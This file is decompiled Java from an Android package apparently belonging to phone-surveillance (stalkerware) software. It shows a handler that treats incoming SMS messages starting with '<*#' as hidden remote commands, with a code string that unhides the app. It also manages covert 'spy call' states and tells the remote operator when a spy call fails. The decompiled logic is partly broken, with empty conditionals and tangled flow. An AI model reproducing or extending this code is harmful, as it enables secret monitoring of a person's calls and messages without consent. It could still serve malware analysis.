package com.vvt.appengine;

import com.vvt.ae.f;
import com.vvt.callhandler.c;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.preference.FxPreferenceException;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.RemoteCommand.Type;
import com.vvt.remotecommand.b;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlImpl;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.sms.SmsInfo;

public class p
  implements com.vvt.base.communication.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.e;
  private AppEngine1 d;
  
  public p(AppEngine1 paramh)
  {
    this.d = paramh;
  }
  
  private void a(ActiveCallInfo paramActiveCallInfo)
  {
    paramActiveCallInfo.getNumber();
    paramActiveCallInfo.isIncoming();
    boolean bool = b;
    if (bool) {}
    c localc = this.d.Q;
    if (localc != null)
    {
      bool = a;
      if (bool) {}
      localc = this.d.Q;
      localc.a(paramActiveCallInfo);
    }
  }
  
  private void a(BugEngineCallState paramBugEngineCallState)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = BugEngineCallState.GSM_IDLE;
    if (paramBugEngineCallState != localObject)
    {
      localObject = BugEngineCallState.CDMA_IDLE;
      if (paramBugEngineCallState != localObject) {}
    }
    else
    {
      localObject = this.d.Q;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d.Q;
        ((c)localObject).d();
      }
    }
  }
  
  private void a(MonitorDisconnectData paramMonitorDisconnectData)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = paramMonitorDisconnectData.getReason();
    Object localObject2 = MonitorDisconnectData.Reason.MUSIC_PLAY;
    if (localObject1 == localObject2)
    {
      localObject1 = paramMonitorDisconnectData.getNumber();
      boolean bool2 = a;
      if (bool2) {}
      localObject2 = this.d.c;
      String str = "Cannot perform a spy call while user is playing music/movie or recording. Try again later.";
      ((f)localObject2).a((String)localObject1, str);
    }
  }
  
  private void a(SmsInfo paramSmsInfo, b paramb)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = paramSmsInfo.getMessageBody();
    Object localObject2;
    boolean bool2;
    Object localObject3;
    if (localObject1 != null)
    {
      localObject1 = ((String)localObject1).trim();
      localObject2 = "<*#";
      bool2 = ((String)localObject1).startsWith((String)localObject2);
      if (bool2)
      {
        localObject2 = "<*#900900900>";
        bool2 = ((String)localObject1).equals(localObject2);
        if (!bool2) {
          break label126;
        }
        bool1 = b;
        if (bool1) {}
        localObject1 = new com/vvt/remotecontrol/ControlCommand;
        localObject2 = RemoteFunction.DEBUG_UNHIDE_APP;
        localObject3 = null;
        ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, null);
      }
    }
    for (;;)
    {
      try
      {
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).q;
        ((RemoteControlImpl)localObject2).execute((ControlCommand)localObject1);
        return;
      }
      catch (Exception localException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      label126:
      bool2 = b;
      if (bool2) {}
      localObject2 = new com/vvt/remotecommand/RemoteCommand;
      ((RemoteCommand)localObject2).<init>();
      localObject3 = RemoteCommand.Type.SMS_COMMAND;
      ((RemoteCommand)localObject2).setType((RemoteCommand.Type)localObject3);
      localObject3 = paramSmsInfo.getPhoneNumber();
      ((RemoteCommand)localObject2).setSender((String)localObject3);
      ((RemoteCommand)localObject2).setData(localException);
      paramb.a((RemoteCommand)localObject2);
    }
  }
  
  public void a(Object paramObject)
  {
    bool = a;
    if (bool) {}
    bool = paramObject instanceof SmsInfo;
    if (bool) {}
    for (;;)
    {
      try
      {
        paramObject = (SmsInfo)paramObject;
        Object localObject = this.d;
        localObject = ((AppEngine1)localObject).p;
        a((SmsInfo)paramObject, (b)localObject);
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
        bool = paramObject instanceof MonitorDisconnectData;
        if (!bool) {
          continue;
        }
        paramObject = (MonitorDisconnectData)paramObject;
        a((MonitorDisconnectData)paramObject);
        continue;
        bool = paramObject instanceof BugEngineCallState;
        if (!bool) {
          continue;
        }
        paramObject = (BugEngineCallState)paramObject;
        a((BugEngineCallState)paramObject);
        continue;
      }
      bool = a;
      if (bool) {}
      return;
      bool = paramObject instanceof ActiveCallInfo;
      if (!bool) {
        continue;
      }
      paramObject = (ActiveCallInfo)paramObject;
      a((ActiveCallInfo)paramObject);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/p.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */